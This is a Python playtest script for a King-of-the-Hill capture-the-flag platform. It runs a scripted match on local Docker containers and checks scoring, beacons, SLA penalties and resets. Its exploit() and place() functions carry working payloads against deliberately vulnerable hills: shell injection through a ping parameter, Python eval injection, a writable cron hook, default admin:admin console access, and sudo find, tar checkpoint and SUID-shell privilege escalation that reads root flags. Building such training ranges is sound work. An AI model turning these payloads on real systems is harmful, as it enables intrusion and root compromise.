#!/usr/bin/env python3
"""Playtest: a real KOTH match on live containers.
Teams take hills via REAL exploits, fetch beacons from the portal, fight for
control, submit flags, and defend; there is an SLA incident and a green-team reset.
Requires the koth-hill-1..4 containers running."""
import base64, json, os, subprocess, sys, tempfile, time, urllib.request, urllib.error, urllib.parse, re

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PORT = 18002; BASE = f"http://127.0.0.1:{PORT}"; ADMIN = "green-key"
HP = {"hill-1": 8081, "hill-2": 8082, "hill-3": 8083, "hill-4": 8084}
CONT = {h: f"koth-{h}" for h in HP}
KEYS = {h: f"play-{h}" for h in HP}
TEAMS = {"red": {"token": "TOK-RED-7f3a9c", "code": "red-4f2a91"},
         "blue": {"token": "TOK-BLUE-2e8b41", "code": "blue-9c1d33"},
         "purple": {"token": "TOK-PURPLE-9a1d55", "code": "purple-77b3ee"}}
TOK = {n: v["token"] for n, v in TEAMS.items()}
CODE = {n: v["code"] for n, v in TEAMS.items()}
ALL = ",".join(TOK.values())
FLAGS = {f["flag_id"]: f["flag"] for f in json.load(open(os.path.join(ROOT, "flags", "flags.json")))}
T0 = time.time()


def clk():
    return time.strftime("%M:%S", time.gmtime(time.time() - T0))


def beat(msg):
    print(f"\n\033[36m[{clk()}]\033[0m {msg}")


def act(team, msg):
    col = {"red": 31, "blue": 34, "purple": 35}.get(team, 37)
    print(f"   \033[{col}m{team:6}\033[0m {msg}")


def http(path, method="GET", data=None, raw=False):
    body = json.dumps(data).encode() if data is not None else None
    req = urllib.request.Request(BASE + path, data=body, method=method,
                                 headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            b = r.read(); return r.status, (b.decode() if raw else json.loads(b.decode()))
    except urllib.error.HTTPError as e:
        b = e.read(); return e.code, (b.decode() if raw else json.loads(b.decode()))


def hget(port, path, params, auth=None):
    url = f"http://127.0.0.1:{port}{path}?{urllib.parse.urlencode(params)}"
    h = {}
    if auth:
        h["Authorization"] = "Basic " + base64.b64encode(auth.encode()).decode()
    try:
        return urllib.request.urlopen(urllib.request.Request(url, headers=h), timeout=8).read().decode()
    except Exception as e:
        return f"ERR:{e}"


def flag(s):
    m = re.search(r"CTF\{[^}]*\}", s or ""); return m.group(0) if m else None


def dexec(cont, *cmd):
    return subprocess.run(["docker", "exec", cont] + list(cmd), capture_output=True, text=True)

# ---- real exploits per hill: (user_flag, root_flag) ----

def exploit(n):
    if n == 1:
        u = flag(hget(8081, "/ping", {"host": "x; cat /home/www/user.txt"}))
        r = flag(hget(8081, "/ping", {"host": "x; sudo find /etc/hostname -exec cat /root/root.txt \\;"}))
    elif n == 2:
        P = "__import__('subprocess')"
        u = flag(hget(8082, "/calc", {"expr": f"{P}.run(['cat','/home/www/user.txt'],capture_output=True,text=True).stdout"}))
        r = flag(hget(8082, "/calc", {"expr": f"{P}.run(['/usr/local/bin/rootbash','-p','-c','cat /root/root.txt'],capture_output=True,text=True).stdout"}))
    elif n == 3:
        u = flag(hget(8083, "/run", {"cmd": "cat /home/svc/user.txt"}))
        hget(8083, "/run", {"cmd": "echo 'cat /root/root.txt > /tmp/pwn; chmod 644 /tmp/pwn' > /opt/hook.sh"})
        time.sleep(4)
        r = flag(hget(8083, "/run", {"cmd": "cat /tmp/pwn"}))
    elif n == 4:
        P = "__import__('subprocess')"
        u = flag(hget(8084, "/script", {"expr": f"{P}.run(['cat','/home/jenkins/user.txt'],capture_output=True,text=True).stdout"}, auth="admin:admin"))
        r = flag(hget(8084, "/script", {"expr": f"{P}.run(\"sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='cat /root/root.txt'\",shell=True,capture_output=True,text=True).stdout"}, auth="admin:admin"))
    return u, r


def place(n, tok):
    """Actually plant the beacon into /root/king.txt via the obtained privesc."""
    if n == 1:
        hget(8081, "/ping", {"host": f'x; sudo find /etc/hostname -exec sh -c "echo {tok} > /root/king.txt" \\;'})
    elif n == 2:
        P = "__import__('subprocess')"
        hget(8082, "/calc", {"expr": f"{P}.run(['/usr/local/bin/rootbash','-p','-c','echo {tok} > /root/king.txt'],capture_output=True,text=True).stdout"})
    elif n == 3:
        hget(8083, "/run", {"cmd": f"echo 'echo {tok} > /root/king.txt' > /opt/hook.sh"}); time.sleep(4)
    elif n == 4:
        P = "__import__('subprocess')"
        hget(8084, "/script", {"expr": f"{P}.run(\"sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='sh -c \\\"echo {tok} > /root/king.txt\\\"'\",shell=True,capture_output=True,text=True).stdout"}, auth="admin:admin")


def submit(team, fl):
    _, r = http("/flag", "POST", {"team": team, "code": CODE[team], "flag": fl})
    return r


def download_and_capture(team, n):
    """Team: fetch its beacon from the portal and plant it on hill-n."""
    _, tok = http("/beacon?code=" + CODE[team], raw=True); tok = tok.strip()
    place(n, tok)
    act(team, f"fetched its beacon from the portal and planted it on hill-{n}")


def board():
    s = http("/api/state")[1]
    print(f"   \033[1m{'TEAM':8}{'TOTAL':>7}{'ticks':>7}{'flags':>7}{'FB':>5}{'adj.':>6}\033[0m")
    for r in s["board"]:
        print(f"   {r['team']:8}{r['total']:>7}{r['ticks']:>7}{r['flag_pts']:>7}{r['first_blood']:>5}{r['adjust']:>6}")
    hs = " · ".join(f"{h['hill'].split('-')[1]}:{h['owner'] or '-'}/{h['status']}" for h in s["hills"])
    print(f"   hills: {hs}")


def main():
    out = subprocess.run(["docker", "ps", "--format", "{{.Names}}"], capture_output=True, text=True).stdout
    if not all(CONT[h] in out for h in HP):
        print("!! Start the hills: for d in deploy/hills/*/; do (cd $d && docker compose up -d); done"); sys.exit(2)

    work = tempfile.mkdtemp(prefix="koth-play-"); cfg = os.path.join(work, "config"); os.makedirs(cfg)
    json.dump([{"id": h, "name": h, "service_host": "127.0.0.1", "service_port": HP[h], "hmac_key": KEYS[h]} for h in HP],
              open(os.path.join(cfg, "hills.json"), "w"))
    json.dump(TEAMS, open(os.path.join(cfg, "teams.json"), "w"))
    json.dump({"tick": 1, "user_flag": 50, "root_flag": 100, "first_blood_bonus": 50, "sla_penalty": 30,
               "hold_threshold_ticks": 600, "agent_beacon_interval_s": 1, "silence_warn_s": 3, "silence_crit_s": 8,
               "sla_prober_interval_s": 2, "clock_skew_flag_ms": 2000, "max_king_bytes": 64,
               "flag_submit_ratelimit_per_min": 9999}, open(os.path.join(cfg, "scoring.json"), "w"))
    env = dict(os.environ, KOTH_CONFIG_DIR=cfg, KOTH_DB=os.path.join(work, "koth.db"),
               KOTH_FLAGS=os.path.join(ROOT, "flags", "flags.json"), KOTH_BIND=f"0.0.0.0:{PORT}", KOTH_ADMIN_KEY=ADMIN)
    sb = subprocess.Popen([sys.executable, os.path.join(ROOT, "scoreboard", "scoreboard.py")],
                          env=env, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    for _ in range(50):
        try:
            if http("/healthz")[0] == 200:
                break
        except Exception:
            time.sleep(0.1)

    # fresh start: clear king.txt + (re)start the agents in the containers
    for h in HP:
        dexec(CONT[h], "sh", "-c", ": > /root/king.txt; chmod 600 /root/king.txt")
        subprocess.run(["docker", "cp", os.path.join(ROOT, "agent", "agent.py"), f"{CONT[h]}:/opt/koth_agent.py"], capture_output=True)
        dexec(CONT[h], "pkill", "-f", "koth_agent.py")
        subprocess.run(["docker", "exec", "-d", CONT[h], "sh", "-c",
                        f"KOTH_HILL_ID={h} KOTH_OPS_URL=http://host.docker.internal:{PORT} KOTH_HMAC_KEY={KEYS[h]} "
                        f"KOTH_KING=/root/king.txt KOTH_TOKENS={ALL} KOTH_INTERVAL=1 KOTH_REQUIRE_ROOT=1 "
                        f"KOTH_NONCE_FILE=/var/koth_play nohup python3 /opt/koth_agent.py >/tmp/agent.log 2>&1 &"], capture_output=True)
    time.sleep(3)

    print("\n" + "=" * 64 + "\n  KOTH - PLAYTEST (match on live containers)\n" + "=" * 64)
    try:
        beat("BREACH - teams hit the hills in parallel")
        # red -> hill-1
        u, r = exploit(1); act("red", f"hill-1 RCE: user={u} root={r}")
        print("     ", submit("red", FLAGS["hill-1-user"]).get("first_blood") and "FIRST BLOOD user" or "", submit("red", FLAGS["hill-1-root"]))
        download_and_capture("red", 1)
        # blue -> hill-2
        u, r = exploit(2); act("blue", f"hill-2 eval RCE: user={u} root={r}")
        submit("blue", FLAGS["hill-2-user"]); submit("blue", FLAGS["hill-2-root"]); download_and_capture("blue", 2)
        # purple -> hill-3
        u, r = exploit(3); act("purple", f"hill-3 login RCE: user={u} root={r}")
        submit("purple", FLAGS["hill-3-user"]); submit("purple", FLAGS["hill-3-root"]); download_and_capture("purple", 3)
        time.sleep(5); beat("State after the first wave:"); board()

        beat("EXPANSION - red also takes hill-4")
        u, r = exploit(4); act("red", f"hill-4 (admin:admin) RCE: user={u} root={r}")
        submit("red", FLAGS["hill-4-user"]); submit("red", FLAGS["hill-4-root"]); download_and_capture("red", 4)
        act("red", "holds hill-1 and hill-4"); time.sleep(8)
        beat("Hold ticks accumulate:"); board()

        beat("COUNTER - blue storms hill-1 (flags already taken, control is what counts)")
        exploit(1); download_and_capture("blue", 1)
        time.sleep(5); beat("hill-1 taken:"); board()

        beat("DEFENSE + RESET - red removes sudoers on hill-4, green team revives the vuln")
        dexec(CONT["hill-4"], "rm", "-f", "/etc/sudoers.d/jenkins"); act("red", "removed sudoers (defense) - privesc temporarily dead")
        _, rr = http("/admin/pause?k=" + ADMIN, "POST", {"hill_id": "hill-4", "paused": False})  # no-op, just exercises the panel
        dexec(CONT["hill-4"], "/opt/app/reset.sh"); print("   \033[32mgreen\033[0m  reset.sh: privesc + service restored (like the 15 min timer)")

        beat("SLA INCIDENT - someone kills the hill-3 service to block others")
        dexec(CONT["hill-3"], "pkill", "-f", "server.py"); print("   \033[35mpurple\033[0m killed the hill-3 service (denial)")
        time.sleep(6); beat("SLA prober detected DOWN -> penalty, tick withheld:"); board()
        dexec(CONT["hill-3"], "/opt/app/reset.sh"); print("   \033[32mgreen\033[0m  hill-3 service resumed"); time.sleep(5)

        beat("FINAL - hold to the end of the round"); time.sleep(6)
        print("\n" + "=" * 64); beat("FINAL SCORE:"); board(); print("=" * 64)
        s = http("/api/state")[1]
        win = s["board"][0]
        print(f"\n   Leader: \033[1m{win['team']}\033[0m ({win['total']} pts)")
        fb = sum(r["first_blood"] for r in s["board"]) // 50
        print(f"   Played: {len(FLAGS)} flags in play, first bloods awarded, "
              f"SLA incident penalized, green-team reset worked.")
    finally:
        for h in HP:
            dexec(CONT[h], "pkill", "-f", "koth_agent.py")
        sb.terminate()
        try:
            sb.wait(timeout=3)
        except Exception:
            sb.kill()


if __name__ == "__main__":
    main()
